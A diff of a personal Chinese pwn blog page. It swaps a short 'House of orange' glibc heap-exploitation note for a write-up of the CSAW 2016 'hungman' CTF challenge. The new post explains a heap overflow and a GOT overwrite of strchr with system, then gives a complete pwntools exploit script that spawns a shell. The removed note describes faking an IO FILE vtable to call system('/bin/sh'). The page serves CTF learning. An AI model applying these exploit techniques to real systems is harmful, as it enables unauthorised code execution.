@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="House of orange, Apr1L&#39;s blog">
+    <meta name="keywords" content="csaw2016_hungman, Apr1L&#39;s blog">
     <meta name="description" content="二进制萌新QAQ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>House of orange | Apr1L&#39;s blog</title>
+    <title>csaw2016_hungman | Apr1L&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('http://www.005.tv/uploads/allimg/190404/63-1Z404152A2512.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('http://www.005.tv/uploads/allimg/190920/67-1Z9201130362S.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">House of orange</h1>
+                    <h1 class="description center-align post-title">csaw2016_hungman</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +383,8 @@
                                 pwn
                             </a>
                         
-                            <a href="/categories/pwn/笔记/" class="post-category">
-                                笔记
+                            <a href="/categories/pwn/wp/" class="post-category">
+                                wp
                             </a>
                         
                     </div>
@@ -396,7 +396,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-26
+                    2020-05-13
                 </div>
                 
 
@@ -412,51 +412,125 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>简单记录一下 House of orange 的利用过程：</p>
-<p><a href="https://github.com/suvii22/pwn/tree/master/house%20of%20orange" target="_blank" rel="noopener">house of orange</a></p>
-<h2 id="修改-top-chunk-的size"><a href="#修改-top-chunk-的size" class="headerlink" title="修改 top chunk 的size"></a>修改 top chunk 的size</h2><p>size 需满足以下条件：</p>
+                <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个程序一开始要输入name，name存储在堆中：</p>
+<pre class=" language-C"><code class="language-C">//相关数据体
+struct 
+{
+    int score;
+    int name_len;
+    char *name;
+}</code></pre>
+<p>然后让你玩游戏，游戏是是让你猜随机生成和你name等长的随机字符串，有三次猜错机会，全部猜出来会获得一次change name的机会。</p>
+<pre class=" language-C"><code class="language-C">if ( v3 == 'y' )
+      {
+        s = malloc(0xF8uLL);
+        memset(s, 0, 0xF8uLL);
+        v8 = read(0, s, 0xF8uLL);
+        *(_DWORD *)(a1 + 4) = v8;
+        v14 = strchr((const char *)s, 10);
+        if ( v14 )
+          *v14 = 0;
+        memcpy(*(void **)(a1 + 8), s, v8);
+        free(s);
+      }</code></pre>
+<p>我们可以看到新输入的name是写到存储着原来name堆块中的，于是这里便可以造成堆溢出，修改结构体中的指向name指针：</p>
+<pre><code>pwndbg&gt; x/40gx 0x603000
+0x603000:    0x0000000000000000    0x0000000000000031
+0x603010:    0x6161616161616161    0x6161616161616161
+0x603020:    0x6161616161616161    0x0000000000006161
+0x603030:    0x0000000000000000    0x0000000000000091
+0x603040:    0x0000001b00000000    0x0000000000603010   &lt;---cover here
+0x603050:    0x0000000000000000    0x0000000000000000
+</code></pre><p>于是我们可以：</p>
 <ul>
-<li>top chunk 大于 <code>MINSIZE</code>，即 0x10</li>
-<li>old_size  &lt;  <code>nb + MINSIZE</code></li>
-<li>PREV_INUSE = 1</li>
-<li><code>old_top + old_size</code> 页对齐    </li>
+<li>第一次change name，修改指针为strchr@got，同时leak libc</li>
+<li>第二次change name，覆写stchr为system</li>
+<li>第三次change name，输入/bin/sh</li>
 </ul>
-<h2 id="申请一块大内存来触发-sysmalloc-中的-int-free"><a href="#申请一块大内存来触发-sysmalloc-中的-int-free" class="headerlink" title="申请一块大内存来触发 sysmalloc() 中的 _int_free()"></a>申请一块大内存来触发 sysmalloc() 中的 _int_free()</h2><p><code>_int_free()</code> 之后，top_chunk 会进入 unsorted bin 中，我们申请一个小于此大小的 chunk 后，因为 bk 指针会保留，所以可以 leak libc ，之后可以进一步 leak 堆地址（这里没有搞明白，之后再来填坑）。</p>
-<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>我们可以通过 <code>unsorted bin attack</code> 来覆盖 IO_list_all 指针；覆盖完 IO_list_all 为 main_arena+88，由于我们无法完全控制 main_arena 的内容，所以需要 <code>chain</code> 来转移到下一个 IO_FILE。</p>
-<p><code>chain</code> 位于_IO_FILE_plus 偏移为 0x68 的位置，所以我们要把 <code>main_arena+88+0x68</code> 的地方覆盖为我们可控制的区域（top_chunk）。我们可以把 old_top 置为0x61，这样触发一个不合适的 small chunk 分配，old_top 就会被放到 smallbins[5] 中，smallbins[5] 刚好在 <code>main_arena+88+0x68</code> 的位置，这样 fp 指向了old_top 。</p>
-<h2 id="申请内存，触发-glibc-异常处理"><a href="#申请内存，触发-glibc-异常处理" class="headerlink" title="申请内存，触发 glibc 异常处理"></a>申请内存，触发 glibc 异常处理</h2><p>我们要伪造内存，将 _IO_OVERFLOW 修改为 system，fp 开头8字节赋值成 “/bin/sh\x00”来 get shell 。为了触发 _IO_OVERFLOW ，我们需要满足一些条件：</p>
-<pre class=" language-C"><code class="language-C">      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
-#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
-       || (_IO_vtable_offset (fp) == 0
-           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
-                    > fp->_wide_data->_IO_write_base))
-#endif
-       )
-      && _IO_OVERFLOW (fp, EOF) == EOF)   <--- system('/bin/sh')</code></pre>
-<ul>
-<li><p>fp-&gt;_mode &lt;= 0</p>
-</li>
-<li><p><code>fp-&gt;_IO_write_ptr</code>  &gt;  <code>fp-&gt;_IO_write_base</code>   </p>
-</li>
-</ul>
-<p>这是我伪造的布局：</p>
-<pre><code>0x5555557584f0:    0x0068732f6e69622f    0x0000000000000061
-0x555555758500:    0x000000000000aabb    0x00007ffff7dd2510
-0x555555758510:    0x0000000000000002    0x0000000000000003
-0x555555758520:    0x0000000000000000    0x0000000000000000
-0x555555758530:    0x0000000000000000    0x0000000000000000
-0x555555758540:    0x0000000000000000    0x0000000000000000
-0x555555758550:    0x0000000000000000    0x0000000000000000
-0x555555758560:    0x0000000000000000    0x0000000000000000
-0x555555758570:    0x0000000000000000    0x0000000000000000
-0x555555758580:    0x0000000000000000    0x0000000000000000
-0x555555758590:    0x0000000000000000    0x0000000000000000
-0x5555557585a0:    0x0000000000000000    0x0000000000000000
-0x5555557585b0:    0x0000000000000000    0x0000000000000000
-0x5555557585c0:    0x0000000000000000    0x00005555557585d0 &lt;vtable_addr&gt;
-0x5555557585d0:    0x0000000000000000    0x0000000000000000
-0x5555557585e0:    0x0000000000000000    0x00007ffff7a52390 &lt;system&gt;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.angelboy.tw/" target="_blank" rel="noopener">angelboy的blog</a></p>
-<p><a href="https://de4dcr0w.github.io/%E5%A0%86%E5%88%A9%E7%94%A8/houseoforange%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#0x03-%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E8%A7%A6%E5%8F%91%E5%BC%82%E5%B8%B8" target="_blank" rel="noopener">houseoforange学习总结</a></p>
+<p>但我卡在了play game上面，我的想法是猜字母的时候raw_input一下，直接从gdb中复制它随机生成的字符串，但是这只能过本地，远程无法gdb.attach()/(ㄒoㄒ)/~~，我查了其他师傅的<a href="https://a7vinx.github.io/2016/09/19/csaw_2016_hungman_writeup/" target="_blank" rel="noopener">wp</a>，知道可以：</p>
+<blockquote>
+<p>如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会</p>
+</blockquote>
+<p>当然还有其他方法来get shell，但殊途同归：<a href="https://bamboofox.github.io/write-ups/2016/09/19/CSAW-CTF-16-Hungman-300.html" target="_blank" rel="noopener">参考</a></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hungman'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hungman'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''
+def pwn():
+    #gdb.attach(p,'p (char *)0x6030f0')
+    guess = raw_input()
+    a = ""
+    for i in guess:
+        if i not in a:
+        a += i        
+    p.send(a)
+    p.recvuntil('change name?')
+    p.sendline('y')
+    time.sleep(0.1)
+'''</span>
+
+<span class="token comment" spellcheck="true">#play函数直接copy上述链接里的</span>
+letters<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyzz'</span>
+<span class="token keyword">def</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> <span class="token string">'-- play --'</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
+        recv<span class="token operator">=</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span> recv
+        <span class="token keyword">if</span> recv<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'High score! change name?'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> recv
+            <span class="token keyword">print</span> <span class="token string">'[*] win!'</span>
+            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        <span class="token keyword">if</span> recv<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'Default Highscore  score: 64'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">'[-] try again...'</span>
+            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Continue? '</span><span class="token punctuation">)</span>
+            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> play<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>c<span class="token punctuation">)</span>     
+
+
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">26</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strchr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">'p (char *)0x6030d0'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#pwn()</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+play<span class="token punctuation">(</span><span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'player: '</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00\x00'</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'strchr'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x30</span>
+success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token triple-quoted-string string">'''
+malloc = libc_base + libc.sym['malloc']
+payload = "sh\x00".ljust(8)
+payload += 'A'*8
+payload += p64(system)
+payload += p64(malloc)
+'''</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Continue? '</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(p,'p (char *)0x6030d0')</span>
+play<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Continue? '</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+<span class="token comment" spellcheck="true">#gdb.attach(p,'p (char *)0x6030d0')</span>
+play<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 
             </div>
             <hr/>
@@ -482,7 +556,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://suvii22.github.io/2020/03/26/House-of-orange/">http://suvii22.github.io/2020/03/26/House-of-orange/</a>
+                    <a href="http://suvii22.github.io/2020/05/13/csaw2016-hungman/">http://suvii22.github.io/2020/05/13/csaw2016-hungman/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -563,9 +637,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/05/13/csaw2016-hungman/">
                     <div class="card-image">
@@ -582,9 +657,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -601,6 +676,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -619,23 +695,23 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/13/IO-FILE/">
+                <a href="/2020/03/26/House-of-orange/">
                     <div class="card-image">
                         
-                        <img src="http://www.005.tv/uploads/allimg/200313/66-200313140151126.jpg" class="responsive-img" alt="IO_FILE">
+                        <img src="http://www.005.tv/uploads/allimg/190404/63-1Z404152A2512.png" class="responsive-img" alt="House of orange">
                         
-                        <span class="card-title">IO_FILE</span>
+                        <span class="card-title">House of orange</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            简单记录一下
+                            学习学习
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-26
                             </span>
                         <span class="publish-author">
                             
